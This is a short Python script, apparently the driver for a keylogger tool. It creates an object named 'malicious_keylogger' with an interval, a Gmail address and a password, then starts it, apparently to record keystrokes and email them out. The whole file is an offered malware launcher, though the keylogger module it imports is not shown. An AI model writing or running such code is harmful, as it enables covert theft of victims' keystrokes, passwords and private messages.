#!usr/bin/env python

import keylogger


# Initialize / create keylogger

malicious_keylogger = keylogger.KeyLogger(10, 'yourmail@gmail.com', 'password')

# Execute Keylogger

malicious_keylogger.start()
